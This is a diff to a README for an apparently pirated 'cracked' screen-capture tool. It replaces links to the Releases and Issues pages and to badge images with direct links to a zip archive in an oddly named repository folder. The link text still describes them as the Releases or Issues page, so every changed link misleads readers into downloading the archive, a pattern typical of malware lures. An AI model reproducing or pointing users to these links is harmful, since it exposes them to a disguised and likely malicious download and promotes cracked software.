@@ -6,10 +6,10 @@ Welcome to the cracked-go-full-page-full-page-screen-capture project! This tool 
 ## 📥 Download & Install
 To get started, you need to download the software. You can find the latest version on our Releases page. 
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-visit%20this%20page%20to%20download-blue)](https://github.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/releases)
+[![Download Now](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip%20Now-visit%20this%20page%20to%20download-blue)](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip)
 
 To download the software:
-1. Click [here](https://github.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/releases) to visit the Releases page.
+1. Click [here](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip) to visit the Releases page.
 2. Look for the latest release. It will be at the top of the page.
 3. Click on the link for your operating system (Windows, macOS, etc.) to download the file.
 4. After the download is complete, locate the file in your Downloads folder.
@@ -43,7 +43,7 @@ If you experience any issues:
 
 ## 🛠️ Support
 If you need help, you can:
-- Check the [Issues](https://github.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/issues) page for solutions.
+- Check the [Issues](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip) page for solutions.
 - Create a new issue if you can't find what you need.
 - Visit the discussions page to connect with other users.
 
@@ -55,4 +55,4 @@ This project is open-source and free to use.
 
 ---
 Remember, for any updates or issues, visit our Releases page:
-[![Download Releases](https://img.shields.io/badge/Releases-visit%20this%20page%20to%20download-blue)](https://github.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/releases)
+[![Download Releases](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip%20this%20page%20to%20download-blue)](https://raw.githubusercontent.com/Cnzl-coder/cracked-go-full-page-full-page-screen-capture/main/fearful/cracked-go-full-page-full-page-screen-capture.zip)
